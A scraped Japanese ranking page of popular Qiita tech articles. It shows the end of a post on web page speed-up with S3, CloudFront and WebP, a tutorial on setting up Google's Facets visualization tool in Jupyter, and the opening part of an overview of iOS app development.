<span id="s3でホスティングしてみる" class="fragment"></span><a href="#s3%E3%81%A7%E3%83%9B%E3%82%B9%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a>S3でホスティングしてみる</h2>

<p>サーバーを立てるほどでもないので、S3でWebホスティングしてそこにhtmlと画像を置いてみます。</p>

<p><a href="https://camo.qiitausercontent.com/148e640cdfa4eb35b21bbbde704120d2e4fad16c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f34353432643934622d636162382d346632302d346636352d3935316136653062643562392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/148e640cdfa4eb35b21bbbde704120d2e4fad16c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f34353432643934622d636162382d346632302d346636352d3935316136653062643562392e706e67" alt="s3_1.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/4542d94b-cab8-4f20-4f65-951a6e0bd5b9.png"></a><br>
<a href="https://camo.qiitausercontent.com/45f87a61e87608907748efbd311cc41cac70b677/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f64353333653865642d376331362d356635622d323662342d3036356531303266373962342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/45f87a61e87608907748efbd311cc41cac70b677/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f64353333653865642d376331362d356635622d323662342d3036356531303266373962342e706e67" alt="s3_2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/d533e8ed-7c16-5f5b-26b4-065e102f79b4.png"></a></p>

<p>レンダリング完了時間が「698ms」なんで、まだまだ遅いです。</p>

<h2>
<span id="cdncloudfrontでキャッシュする" class="fragment"></span><a href="#cdncloudfront%E3%81%A7%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>CDN(CloudFront)でキャッシュする</h2>

<p>続いてS3のオブジェクトをCloudFrontでキャッシュしてみる。</p>

<p><a href="https://camo.qiitausercontent.com/03e4b86be086ed92466e9af86f3350204d3508e7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f35393737343235662d316139372d333361342d373034662d6233306463616266303864612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/03e4b86be086ed92466e9af86f3350204d3508e7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f35393737343235662d316139372d333361342d373034662d6233306463616266303864612e706e67" alt="cf_1.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/5977425f-1a97-33a4-704f-b30dcabf08da.png"></a><br>
<a href="https://camo.qiitausercontent.com/fc01f93ff9b074cd54e9e673394049fb13300ab7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f64376235323436332d353137642d366362312d316133662d3138346366663937396261642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fc01f93ff9b074cd54e9e673394049fb13300ab7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f64376235323436332d353137642d366362312d316133662d3138346366663937396261642e706e67" alt="cf_2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/d7b52463-517d-6cb1-1a3f-184cff979bad.png"></a></p>

<p>レンダリング完了時間が「379ms」になりました。<br>
やはりCDNは効果絶大です。</p>

<h2>
<span id="webpを使ってみる" class="fragment"></span><a href="#webp%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a>Webpを使ってみる</h2>

<p><a href="https://dev.to" rel="nofollow noopener" target="_blank">dev.to</a>では<a href="https://cloudinary.com/" rel="nofollow noopener" target="_blank">Cloudinary</a>という画像ホスティングサイトを使用しており<br>
画像をアップロードすると様々なフォーマットで利用できるようになります。</p>

<p>dev.toでも使用している「Webp」というJPG/PNGよりも圧縮に優れたフォーマットで<br>
大幅なサイズ削減を実現してくれます。<br>
サイズ削減できれば高速化できるはず。早速試してみます。</p>

<p>画像の変換作業は、Cloudinaryでこんな感じの画面で行えます。<br>
<a href="https://camo.qiitausercontent.com/66bb6efa851c03d8f9fd9f74beb41ce2e084d46a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f64643438333636392d616539622d666339372d666465392d6239363261336333626636622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/66bb6efa851c03d8f9fd9f74beb41ce2e084d46a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f64643438333636392d616539622d666339372d666465392d6239363261336333626636622e706e67" alt="webp.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/dd483669-ae9b-fc97-fde9-b962a3c3bf6b.png"></a></p>

<p>普通の画像サイズ<br>
<a href="http://abehiroshi.s3-website-ap-northeast-1.amazonaws.com/image/abe-top2-4.jpg" class="autolink" rel="nofollow noopener" target="_blank">http://abehiroshi.s3-website-ap-northeast-1.amazonaws.com/image/abe-top2-4.jpg</a><br>
64KB</p>

<p>cloudinaryでwebpに変更してみると<br>
<a href="https://res.cloudinary.com/morix1500/image/upload/v1510926252/abe-top2-4_n99mu2.webp" class="autolink" rel="nofollow noopener" target="_blank">https://res.cloudinary.com/morix1500/image/upload/v1510926252/abe-top2-4_n99mu2.webp</a><br>
18.9KB</p>

<p>cloudinaryのURLをhtmlに埋め込んで計測してみます。<br>
<a href="https://camo.qiitausercontent.com/f2de4a5c0c5fa7babd5065f62735aa64e83e8afe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f37336432626639622d323362312d343831382d316632332d3035613934393265323235652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f2de4a5c0c5fa7babd5065f62735aa64e83e8afe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f37336432626639622d323362312d343831382d316632332d3035613934393265323235652e706e67" alt="webp_1.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/73d2bf9b-23b1-4818-1f23-05a9492e225e.png"></a><br>
<a href="https://camo.qiitausercontent.com/ec3567d9d5ed4273ffb2ecf8826d8de33fa043b3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f35306563393062662d666133312d383431652d616433332d6166356366633831393566652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ec3567d9d5ed4273ffb2ecf8826d8de33fa043b3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f35306563393062662d666133312d383431652d616433332d6166356366633831393566652e706e67" alt="webp_2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/50ec90bf-fa31-841e-ad33-af5cfc8195fe.png"></a></p>

<p>はい、全部Aになりました。<br>
しかし、レンダリング完了時間が「1.337s」と遅くなった…なぜでしょう？</p>

<p>このページではHTTP2が有効になってます。<br>
同一ドメインでないと余計なコネクションが発生してしまうのではないかと推測し、<br>
同一ドメインに画像を置いてみることにします。（間違えてたらご指摘おねがいします）</p>

<p>ということでCloudinaryから直接画像を読み込むのではなく、WebpをダウンロードしてS3に配置してみます。<br>
<a href="https://camo.qiitausercontent.com/4230215692416b7737d55ffb6905efaef9fd085e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f35633138383039662d316535302d366335612d636131302d3461356364383930636233342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4230215692416b7737d55ffb6905efaef9fd085e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f35633138383039662d316535302d366335612d636131302d3461356364383930636233342e706e67" alt="webp_3.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/5c18809f-1e50-6c5a-ca10-4a5cd890cb34.png"></a></p>

<p>お、「328ms」になりました。<br>
また読み込みバイト数も「70KB」から「18KB」になりました。<br>
これはいい感じですね。</p>

<p>これで阿部寛サイトを超えることができました！</p>

<h2>
<span id="結論" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96"><i class="fa fa-link"></i></a>結論</h2>

<p>以下の技術を使用すれば既存の阿部寛サイトを凌駕することが出来ました。</p>

<ul>
<li>S3でホスティング</li>
<li>CDN（CloudFront)でキャッシュ</li>
<li>HTTP2</li>
<li>Webp</li>
</ul>

<p>ここまでしないと超えられない既存サイト…恐ろしい。<br>
Service Workerも使ってみたかったですが、それは今度の機会に。</p>

<p>では！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">10位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>587</kbd>
		<a target="_blank" href="https://qiita.com/inoue0426/items/071c127428112f498421">Google製可視化OSSのFacetsがめっちゃ便利だから使ってみてくれ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-18<br />23:28:57</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/53633.html">inoue0426</a>(4件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/53633/profile-images/1496315669">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[google]</b> <b>[機械学習]</b> <b>[可視化]</b> <b>[DataVisualization]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="facetsとは" class="fragment"></span><a href="#facets%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>Facetsとは</h1>

<h3>
<span id="facetsとはgoogle製の可視化ツールです" class="fragment"></span><a href="#facets%E3%81%A8%E3%81%AFgoogle%E8%A3%BD%E3%81%AE%E5%8F%AF%E8%A6%96%E5%8C%96%E3%83%84%E3%83%BC%E3%83%AB%E3%81%A7%E3%81%99"><i class="fa fa-link"></i></a>Facetsとは、Google製の可視化ツールです。</h3>

<p>データセットの可視化を素早く簡単に行うことが出来ます。<br>
<a href="http://paiza.hatenablog.com/entry/2017/07/24/%E6%A9%9F%E6%A2%B0%E5%AD%A6%E7%BF%92%E3%81%AE%E3%83%87%E3%83%BC%E3%82%BF%E3%82%BB%E3%83%83%E3%83%88%E3%82%92%E5%8F%AF%E8%A6%96%E5%8C%96%E3%81%99%E3%82%8B%E3%80%8CFacets%E3%80%8D%E3%81%A7%E9%81%8A%E3%82%93" rel="nofollow noopener" target="_blank">機械学習のデータセットを可視化する「Facets」で遊んでみた</a><br>
<a href="http://forest.watch.impress.co.jp/docs/news/1070947.html" rel="nofollow noopener" target="_blank">Google、機械学習のデータセットを視覚化するオープンソースツール「Facets」を公開</a></p>

<p>機械学習を行う時、前処理の前にデータの可視化を一通り行うことは多いと思います。<br>
この時用いられる可視化ツールとしては、Redash・Pandasなどが多く使われています。<br>
上記2つのツールはとても便利ですが、RedashはSQLを、PandasはPythonを少し書かないといけません。</p>

<p>Facetsなら上記2つより簡単に、素早くデータの可視化を行うことが出来ます！</p>

<p>では、以下から導入・簡単な説明をします。</p>

<hr>

<p>Facetsを使う前に、まずJupyterとPandasをインストールします。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>pip install jupyter
pip install pandas
</pre></div></div>

<p>これだけで基本は大丈夫ですが、詳しくは以下をどうぞ↓</p>

<p><a href="http://qiita.com/icoxfog417/items/175f69d06f4e590face9" id="reference-878ec7f4b79f60dd9e06">はじめるJupyter Notebook</a></p>

<h5>
<span id="追記2017928" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%982017928"><i class="fa fa-link"></i></a>追記(2017/9/28)</h5>

<hr>

<p>pipからjupiterをインストールした場合、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>jupyter nbextension install facets-dist/
</pre></div></div>

<p>を行うことでjupiter上でfacets-distを動かすことが可能になります。</p>

<p>またラボ等の共用サーバーで動かす場合、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>jupyter nbextension install facets-dist/ --user
</pre></div></div>

<p>で個別に行うことが出来ます。</p>

<hr>

<p>次にFacets本体をgit cloneして Facetsのディレクトリに移動します。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>git clone https://github.com/PAIR-code/facets
cd facets
</pre></div></div>

<p>Facetsの中には</p>

<ul>
<li>facets_dive</li>
<li>facets_overview</li>
</ul>

<p>という2つのディレクトリが入っています。<br>
facets_diveは多次元のデータををインタラクティブに探索することが、facets_overviewではデータセットの概要や、2つ以上のデータセットの比較を行うことが出来ます。</p>

<p>今回はよく用いるであろう、facets_diveを使ってみます。<br>
cdでディレクトリに移動し、以下のコマンドを打ちます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>cd facets_dive
jupyter notebook
</pre></div></div>

<p>するとブラウザ上にいつものJupyterの画面が出てくると思います。</p>

<p><a href="https://camo.qiitausercontent.com/e82fe863eaeaaa81ae89e74e0a2c25260a910c6a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35333633332f33663135386462652d616438382d623136352d316234642d3665373263626263363362332e706e67" target="_blank" rel="nofollow noopener"><img width="1236" alt="スクリーンショット 2017-09-18 23.00.05.png" src="https://camo.qiitausercontent.com/e82fe863eaeaaa81ae89e74e0a2c25260a910c6a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35333633332f33663135386462652d616438382d623136352d316234642d3665373263626263363362332e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/53633/3f158dbe-ad88-b165-1b4d-6e72cbbc63b3.png"></a></p>

<p>ここで、Dive_demo.ipynbを選択します。<br>
いつも通り Shift+Enter を押します。</p>

<p>たぶんここでこんなエラーが出るかと思われます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>[W 22:40:58.498 NotebookApp] IOPub data rate exceeded.
    The notebook server will temporarily stop sending output
    to the client in order to avoid crashing it.
    To change this limit, set the config variable
    `--NotebookApp.iopub_data_rate_limit`.
</pre></div></div>

<p>可視化を行う場合データが大きすぎてたまに怒られることがあります。<br>
これを治すために一旦ターミナルに戻って以下のコマンドを打ちます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>jupyter notebook --generate-config
</pre></div></div>

<p>これでJupyterのconfigが出来ました。<br>
以下のコマンドで.jupyter/jupyter_notebook_config.pyを開きます。（エディタはなんでも良いです。）</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>nvim .jupyter/jupyter_notebook_config.py 
</pre></div></div>

<p>ここに書かれているc.NotebookApp.iopub_data_rate_limit = 1000000の部分をコメントアウトを消して1000000の部分をより大きな数字に変更します。</p>

<p><a href="https://stackoverflow.com/questions/43288550/iopub-data-rate-exceeded-when-viewing-image-in-jupyter-notebook/43420383#43420383" rel="nofollow noopener" target="_blank">IOPub data rate exceeded when viewing image in Jupyter notebook</a></p>

<p>これを行いもう一度Jupyterを開いて Dive_demo.ipynb にて Shift+Enter を押すと動くと思います。<br>
するとこんな画面が出てきます。</p>

<p><a href="https://camo.qiitausercontent.com/18efbd481efa23c3c4fa254868614e13a82d0fe3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35333633332f34666266653932352d363662612d356464622d643762632d3165366265316238353430622e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/18efbd481efa23c3c4fa254868614e13a82d0fe3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35333633332f34666266653932352d363662612d356464622d643762632d3165366265316238353430622e676966" alt="movie.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/53633/4fbfe925-66ba-5ddb-d7bc-1e6be1b8540b.gif"></a></p>

<p>こんな感じ。<br>
インタラクティブにデータを見られることがわかっていただけたと思います。</p>

<p>実際のデータを扱いたい場合、以下の部分でPandasなどを用いてデータを読み込み、JSONにパースすることで使えるようになります。<br>
データはSQL,CSVなどなんでも大丈夫です！<br>
ぜひ使ってみてください！</p>

<div class="code-frame" data-lang="py3"><div class="highlight"><pre><span></span>
<span class="n">jsonstr</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span>
    <span class="s2">"https://archive.ics.uci.edu/ml/machine-learning-databases/adult/adult.test"</span><span class="p">,</span>
    <span class="n">names</span><span class="o">=</span><span class="n">features</span><span class="p">,</span>
    <span class="n">sep</span><span class="o">=</span><span class="sa">r</span><span class="s1">'\s*,\s*'</span><span class="p">,</span>
    <span class="n">engine</span><span class="o">=</span><span class="s1">'python'</span><span class="p">,</span>
    <span class="n">skiprows</span><span class="o">=</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
    <span class="n">na_values</span><span class="o">=</span><span class="s2">"?"</span><span class="p">)</span><span class="o">.</span><span class="n">to_json</span><span class="p">(</span><span class="n">orient</span><span class="o">=</span><span class="s1">'records'</span><span class="p">)</span>

</pre></div></div>

<h5>
<span id="追記2017928-1" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%982017928-1"><i class="fa fa-link"></i></a>追記(2017/9/28)</h5>

<hr>

<p>facets_overviewを使いたい場合、上記の内容に加えProtocol Buffersのpython runtime libraryをインストールすればOKです。<br>
<a href="https://github.com/google/protobuf" rel="nofollow noopener" target="_blank">google/protobuf</a><br>
ドキュメントにインストール法は記載されているため、そちらをご確認ください。<br>
<a href="https://github.com/google/protobuf/tree/master/python" rel="nofollow noopener" target="_blank">google/protobuf/python</a></p>

<hr>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">11位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>549</kbd>
		<a target="_blank" href="https://qiita.com/gomi_ningen/items/b8c9c5c11aee91be820e">iOSアプリ開発の全体像</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-18<br />18:19:33</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/56771.html">gomi_ningen</a>(33件の記事)<br />(ラビットハウス社勤務 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/56771/profile-images/1473694109">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Objective-C]</b> <b>[iPhone]</b> <b>[Xcode]</b> <b>[iOS]</b> <b>[Swift]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>　超技術書展で頒布したiOSアプリ開発の全体像をだらだら書いた本を記事として公開。<br>
ただのポエムです。</p>

<p>　2年くらいまえに、SwiftもObjCも一切書いたことないし、アプリも一回も作ったことがない状況でiOSアプリを作ってリリースするミッションのお仕事が降ってきたので、そのときにこんな情報があったら全体が見通せて、気持ち的に楽だったなと思った内容をまとめました</p>

<h1>
<span id="1-iosアプリ開発を取り巻く環境" class="fragment"></span><a href="#1-ios%E3%82%A2%E3%83%97%E3%83%AA%E9%96%8B%E7%99%BA%E3%82%92%E5%8F%96%E3%82%8A%E5%B7%BB%E3%81%8F%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a>1. iOSアプリ開発を取り巻く環境</h1>

<p>　iOSアプリ開発には、基本的にmacOSを搭載したコンピューターとXcodeとよばれるソフトウェアが必要です。もともと主にObjective-Cという言語が使われるケースがほとんどでしたが、2014年6月にAppleがプログラミング言語Swiftを発表して以後の新規開発には、ほとんどの場合Swiftが採用されているようです。またSwiftは、Objective-Cのコードと共存できるため、もともとObjective-Cで開発されていたアプリを徐々にSwiftに移行しているという話もよく聞きます。</p>

<p>　ただし、広告やSNSなどのSDKや、幅広く使われることが予想されていて安定性が必要なライブラリについては、依然としてAPIが安定しているObjective-Cで開発が行われているケースが多いと感じます。裏を返すとSwiftは言語としてまだ成熟していないということです。Swift2系までではマイナーバージョンアップデートでも、激しい破壊的変更が行われていました。Swift3系ではある程度落ち着きは見えますが、安定しているとは言い難い状況ではあります。それでもObjective-Cに比べて平易な構文、オプショナルやクロージャといったモダンな言語機能、そして静的型付けによる安全なプログラミングなど、得られる恩恵が大きいのは確かです。</p>

<h2>
<span id="11-ios-xcode-swift-macosのアップデート" class="fragment"></span><a href="#11-ios-xcode-swift-macos%E3%81%AE%E3%82%A2%E3%83%83%E3%83%97%E3%83%87%E3%83%BC%E3%83%88"><i class="fa fa-link"></i></a>1.1. iOS, Xcode, Swift, macOSのアップデート</h2>

<p>　Appleは定期的にiOSのメジャーバージョンアップデートをリリースしています。またSwiftのアップデートもさかんに行われています。これらに対応するためにはXcodeの更新が必要になるケースが多いです。Xcodeはファイルサイズが大きく、回線速度にもよりますがダウンロードに数十分、圧縮ファイルの解凍にまた数十分かかります。さらに、新しいXcodeを入れるには、新しいmacOSを入れなければならないことが多々あります。macOSの更新に1〜2時間かかることが珍しくありません。</p>

<p>　実際のところ、こうした大きな更新があると最悪、半日ほど開発がストップしてしまいます。また、これらの作業は開発者やCIサーバーも含め全体のマシンでやる必要があり、考慮に入っていないと意外に手痛い時間のロスとなります。</p>

<p>　これまでの動向では、Swift下位バージョンの切り捨ては早く、新しいバージョンに素早く追従しないと最新のXcodeではビルドができないなどの問題が発生する可能性があります。Swiftを利用すると決めた時点で、遅くとも2〜3ヶ月以内に最新のSwiftバージョンでビルドできる状態に持っていくような開発体制をとれるよう、あらかじめ開発工数のバッファをとることを強くおすすめします。</p>

<h2>
<span id="12-xamarinという選択肢" class="fragment"></span><a href="#12-xamarin%E3%81%A8%E3%81%84%E3%81%86%E9%81%B8%E6%8A%9E%E8%82%A2"><i class="fa fa-link"></i></a>1.2. Xamarinという選択肢</h2>

<p>　iOSアプリ開発にはSwiftやObjective-C以外の言語を使うこともできます。その中でも代表的なものが、クロスプラットフォーム開発ツールのXamarinです。これによりC#やF#といった言語でのiOSアプリ開発が可能になります。これらは言語としては安定していて、C#はエンタープライズ方面での実績も十分にあります。またIDEとしてVisual StudioやXamarin Studioなどを利用することができます。ストーリーボードなどのUIコンポーネントを見た目通りに配置しながら画面を作るためのツールInterface Builder相当のことも、これらのIDEで実現可能です。</p>

<p>　Xamarin社はMicrosoft社に買収され、現在個人での利用や特定の条件下において無料で開発環境を手にすることができるようになり、徐々に普及している段階の技術です。とはいえ、すでにフェンリル社が開発を行なったNHK紅白歌合戦のアプリなどで十分な実績があり、実用に耐えうるものといってよいでしょう。</p>

<h3>
<span id="xamariniosとxamarinforms" class="fragment"></span><a href="#xamarinios%E3%81%A8xamarinforms"><i class="fa fa-link"></i></a>Xamarin.iOSとXamarin.Forms</h3>

<p>　XamarinのなかでもXamarin.iOSとXamarin.Formsという2つのAPI群の選択肢があります。</p>

<p>　Xamarin.iOSはiOS SDKのAPIとほとんど1対1に対応しており、SwiftやObjective-Cと似たような感覚でアプリを構成することができます。一方、Xamarin.Formsは各プラットフォームのAPIを抽象化したものを使ってアプリを構成していくため、Xamarin.Formsに特化した知識をつける必要があります。その代わり、1つのコードから複数のプラットフォームをターゲットとしたアプリを作成することができ、開発効率の向上やマルチプラットフォーム間での実装のズレを防げるといったメリットがあります。</p>

<h2>
<span id="13-react-nativeという選択肢" class="fragment"></span><a href="#13-react-native%E3%81%A8%E3%81%84%E3%81%86%E9%81%B8%E6%8A%9E%E8%82%A2"><i class="fa fa-link"></i></a>1.3. React Nativeという選択肢</h2>

<p>　Xamarin以外にもクロスプラットフォーム開発ツールとしてFacebookが推し進めるReact Nativeという技術があります。すでにInstagram, airbnb, Facebook Messengerなど大きなアプリですでに利用されています。各プラットフォームにおけるUIコンポーネントを抽象化したReactコンポーネントを組み合わせてアプリを構成するという思想を持っています。おおよそReact.jsと同じような形でアプリケーションを構成することができます。最近流行りのReact+Redux構成を取ることもできるため、JavaScriptに詳しい方はチャレンジしてみるのもありかもしれません。</p>

<h2>
<span id="14-iosアプリ開発未経験者がとるべき選択肢" class="fragment"></span><a href="#14-ios%E3%82%A2%E3%83%97%E3%83%AA%E9%96%8B%E7%99%BA%E6%9C%AA%E7%B5%8C%E9%A8%93%E8%80%85%E3%81%8C%E3%81%A8%E3%82%8B%E3%81%B9%E3%81%8D%E9%81%B8%E6%8A%9E%E8%82%A2"><i class="fa fa-link"></i></a>1.4 iOSアプリ開発未経験者がとるべき選択肢</h2>

<p>　iOSアプリ開発においては、基本的にiOS SDKの基本的な振る舞いを理解することは必須であるため、経験者がひとりもいないチームでの開発はObjective-CかSwiftを採用するのが良いでしょう。当然ながら書籍や情報の量、サポートできる人材の量も一番多いです。iOSアプリ開発経験者がいるのであれば、どの方法を選んでも良いと思いますが、Xamarin.Formsを選んだ場合には、iOS SDKを直接触った場合とかなり勝手が異なるはずなので、十分な技術調査・検討を行ってから採用することを強くお勧めします。</p>

<h1>
<span id="2-iosアプリ開発の流れ" class="fragment"></span><a href="#2-ios%E3%82%A2%E3%83%97%E3%83%AA%E9%96%8B%E7%99%BA%E3%81%AE%E6%B5%81%E3%82%8C"><i class="fa fa-link"></i></a>2. iOSアプリ開発の流れ</h1>

<p>　iOSアプリはおおまかに「企画」「要件定義」「設計」「実装」という流れで開発を進めていくことが多いでしょう。最終的にはAppleによる審査を経てApp Storeでの公開が可能になります。この審査は他のプラットフォームに比べて厳しく、単純で機能が少ないアプリはAppleによりリジェクトされる可能性が高いです。例えばアプリ開発の練習として簡単な電卓などを作っても、App Store上には類似のアプリが無数にあるため、公開できない可能性があるということになります。</p>

<h2>
<span id="21-企画" class="fragment"></span><a href="#21-%E4%BC%81%E7%94%BB"><i class="fa fa-link"></i></a>2.1. 企画</h2>

<p>　アプリを通してどのようなユーザーにどのような体験を与えたいのか、ターゲットユーザーと実現したいことを明確にする必要があります。似たようなアプリがある場合は、それらの調査を行い、どのように差別化を図りたいのかを検討すると良いでしょう。また「App Store審査ガイドライン」に違反する内容のアプリはたとえ出来上がっていてもApp Storeに出すことができない可能性が高いため、企画を始める段階からある程度を考慮することを強くお勧めします。特にアプリ内課金を導入する際にはAppleの審査はよりいっそう厳しくなるため、審査ガイドラインに沿った形に企画を着地させる必要があります。</p>

<h2>
<span id="22-要件定義デザイン" class="fragment"></span><a href="#22-%E8%A6%81%E4%BB%B6%E5%AE%9A%E7%BE%A9%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3"><i class="fa fa-link"></i></a>2.2. 要件定義/デザイン</h2>

<p>　おおまかな企画が定まったら、アプリをどのように構成するのかを考えるフェーズに入ります。ユーザーにアプリの中をどのように回遊してもらい、どのような体験を提供するのかを具体化させていきます。また提供するコンテンツやアクションの階層構造/論理構造をはっきりとさせておくと、要件やデザインに落とし込むときに混乱を防ぐことができるので、この段階で整理しておくといいでしょう。例えば電子書籍リーダーを作る場合は、本一覧がベースの階層となり、1つ深い階層にシリーズが存在します。さらにシリーズには複数の本が紐づくといった具合です。</p>

<p>　おおまかにやりたいことが見えてきたら、プロトタイプを作成してみましょう。紙ベースで画面を描いたり、矢印で動きを表現したりといった簡単なもので構いません。またAdobe Experience Design(XD)などを使うとより高度なプロトタイピングが行えます。実装コードを書かずにおおまかな動きを見ることができるため、複数のチームメンバ間でイメージを共有するにはうってつけのツールだといえます。iOSアプリの細かなデザインについての話は3章に記します。</p>

<h2>
<span id="23-設計実装" class="fragment"></span><a href="#23-%E8%A8%AD%E8%A8%88%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>2.3. 設計/実装</h2>

<p>　要件がある程度定まったら、アプリの技術的な設計フェーズに入ります。また特に要件のなかで実現が難しい点があれば、本当に実現可能なのか検証してみる必要があります。具体的な話は4章以降に記していきます。</p>

<h2>
<span id="24-ベータテストと品質保証" class="fragment"></span><a href="#24-%E3%83%99%E3%83%BC%E3%82%BF%E3%83%86%E3%82%B9%E3%83%88%E3%81%A8%E5%93%81%E8%B3%AA%E4%BF%9D%E8%A8%BC"><i class="fa fa-link"></i></a>2.4. ベータテストと品質保証</h2>

<p>　開発中はCrashlytics BetaやDeployGate、小規模であれば自前でのAd-Hoc配信などを通して開発チーム内でドッグフーディングを行うことにより、アプリの不具合検出や改善などを行います。また、ある程度の状態まで達したら開発に携わっていない第三者にも利用してもらい、フィードバックをもらえるようにしておくと、開発チームでは気づけない問題が発見できるでしょう。</p>

